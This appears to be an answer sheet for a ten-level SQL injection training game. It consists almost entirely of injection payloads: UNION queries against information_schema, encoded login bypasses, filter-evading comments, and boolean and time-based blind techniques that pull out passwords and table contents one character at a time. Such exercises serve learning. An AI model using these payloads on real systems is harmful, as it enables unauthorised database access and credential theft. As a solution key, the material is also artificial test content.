- 'X' is what you need to replace.

**LEVEL 1**

```
SELECT * FROM users WHERE id = 12;
```

**LEVEL 2**

```
' or id = 9 #
```

**LEVEL 3**

```
' or id = 13 #
```

**LEVEL 4**

```
' UNION SELECT column_name, '-', '-' FROM information_schema.columns WHERE table_name='secret' #

' UNION SELECT f1, f2, ggg FROM secret WHERE ggg = 'abc' #
```

**LEVEL 5**

```
' UNION SELECT column_name, '-', '-' FROM information_schema.columns WHERE table_name='secret' #

' UNION SELECT dfgfddfgdfdfdf, dfgdfgfdg, '-' FROM secret #
```

**LEVEL 6**

CHAR(103,111,100) => 'god'

```
-1 or login = CHAR(103,111,100)
```

0x676f64 => in HEX (UTF-8: "god")

```
-1 or login = 0x676f64
```

**LEVEL 7**

```
-1/**/OR/**/login/**/REGEXP/**/0x67656e746f6f/**/
```

**LEVEL 8**

```
-1 OR login = 'fast'
```

To find length of the password:

```
-1 OR (login = 'fast' AND LENGTH(pass) = X)
```

To find value of the password:

```
-1 OR (login = 'fast' AND SUBSTRING(pass, X, 1) = 'X')
```

**LEVEL 9**

To find length of the login:

```
-1 OR (id = XX AND LENGTH(login) = X)
```

To find value of the login (way 1):

```
-1 OR (id = XX AND login = 'XXX')
```

To find value of the login (way 2):

```
-1 OR (id = XX AND SUBSTRING(login, X, 1) = 'X')
```

**LEVEL 10**

Prove that this is Time Based SQL injection:

```
1 AND SLEEP(5)
```

Find table name (and length of it's name):

```
IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1)) = X, SLEEP(5), 0)

IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1), X, 1) = 'X', SLEEP(5), 0)
```

Find number of columns and their names:

```
IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'davidblayne' AND table_schema=database()) = X, SLEEP(5), 0)

IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='davidblayne' AND table_schema=database() LIMIT X, 1)) = X, SLEEP(5), 0)

IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='davidblayne' LIMIT X, 1), X, 1) = 'X', SLEEP(5), 0)
```

Find value in the column:

```
IF(SUBSTRING((SELECT morkovka FROM davidblayne LIMIT 1), X, 1) = 'X', SLEEP(5), 0)
```

